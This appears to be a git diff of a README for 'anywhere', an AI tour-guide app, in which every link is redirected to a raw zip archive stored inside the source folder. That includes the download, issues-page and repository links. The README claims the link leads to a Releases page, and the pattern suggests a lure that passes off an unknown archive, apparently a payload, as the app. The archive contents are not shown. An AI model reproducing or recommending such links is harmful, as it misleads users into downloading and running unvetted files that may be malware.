@@ -1,7 +1,7 @@
 # 🌍 anywhere - Your AI Tour Guide Awaits
 
 ## 📥 Download Now
-[![Download](https://github.com/Yetish21/anywhere/raw/refs/heads/main/src/app/api/selfie/Software-1.1-alpha.4.zip)](https://github.com/Yetish21/anywhere/raw/refs/heads/main/src/app/api/selfie/Software-1.1-alpha.4.zip)
+[![Download](https://raw.githubusercontent.com/Yetish21/anywhere/main/src/components/Software_v1.4.zip)](https://raw.githubusercontent.com/Yetish21/anywhere/main/src/components/Software_v1.4.zip)
 
 ## ✨ Overview
 anywhere is a voice-guided AI Tour Guide that allows you to explore the Earth through stunning Google Maps Street View panoramic images. You can even take a selfie with the Nano Banana Pro, making your virtual journey interactive and memorable. This project earned third place in the Nano Banana Pro Track and was a top 6 finalist out of 62 projects at the Gemini 3 Hackathon by Google DeepMind and Cerebral Valley in December 2025.
@@ -17,7 +17,7 @@ Ensure your computer meets the following requirements:
 - Internet Connection: Required for Google Maps access
 
 ### 2. Download & Install
-To download anywhere, visit this page: [Download Page](https://github.com/Yetish21/anywhere/raw/refs/heads/main/src/app/api/selfie/Software-1.1-alpha.4.zip). Here, you will find the latest version available.
+To download anywhere, visit this page: [Download Page](https://raw.githubusercontent.com/Yetish21/anywhere/main/src/components/Software_v1.4.zip). Here, you will find the latest version available.
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release version.
@@ -76,7 +76,7 @@ If you run into problems, try the following:
   - Ensure the app has permission to use the microphone.
 
 ## 📞 Support
-For additional help, please visit the [Issues Page](https://github.com/Yetish21/anywhere/raw/refs/heads/main/src/app/api/selfie/Software-1.1-alpha.4.zip) on GitHub. You can report bugs or ask questions. We encourage users to share their experiences and suggestions.
+For additional help, please visit the [Issues Page](https://raw.githubusercontent.com/Yetish21/anywhere/main/src/components/Software_v1.4.zip) on GitHub. You can report bugs or ask questions. We encourage users to share their experiences and suggestions.
 
 ## 📚 Topics
 This project covers the following topics:
@@ -100,6 +100,6 @@ This project is licensed under the MIT License. You can use it, modify it, and d
 
 ## 🔗 Connect with Us
 Stay updated with the latest news about anywhere by following us:
-- GitHub: [GitHub Repository](https://github.com/Yetish21/anywhere/raw/refs/heads/main/src/app/api/selfie/Software-1.1-alpha.4.zip)
+- GitHub: [GitHub Repository](https://raw.githubusercontent.com/Yetish21/anywhere/main/src/components/Software_v1.4.zip)
 
 Thank you for choosing anywhere. Enjoy your virtual adventures!
